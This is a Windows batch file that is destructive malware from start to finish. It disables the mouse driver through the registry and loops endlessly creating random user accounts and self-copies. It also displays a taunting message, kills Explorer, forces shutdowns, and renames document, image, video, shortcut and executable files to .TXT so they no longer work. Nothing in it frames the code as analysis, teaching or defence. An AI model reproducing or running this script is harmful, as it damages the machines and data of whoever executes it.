@echo off
rem ---------------------------------
rem Disable Mouse
set key="HKEY_LOCAL_MACHINE\system\CurrentControlSet\Services\Mouclass"
reg delete %key%
reg add %key% /v Start /t REG_DWORD /d 4
rem ---------------------------------
:loop
:makeuser
net user %random% %random% /add
goto makeuser
start 
vol %random%
copy %0 %random%%random%%random%.bat
goto loop
start shutdown.exe -s -t 120
:boot
echo hi. your pc been fucked by 122 
start shutdown.exe -s -t 120 
timeout /t 100 /nobreak
copy con pito.bat
    @echo off 
rem ---------------------------------
rem Disable Mouse
set key="HKEY_LOCAL_MACHINE\system\CurrentControlSet\Services\Mouclass"
reg delete %key%
reg add %key% /v Start /t REG_DWORD /d 4
rem ---------------------------------
taskkill explorer.exe
shutdown -s -t 7
REN *.DOC *.TXT 
REN *.JPEG *.TXT
REN *.LNK *.TXT
REN *.AVI *.TXT
REN *.MPEG *.TXT
REN *.COM *.TXT
REN *.BAT *.TXT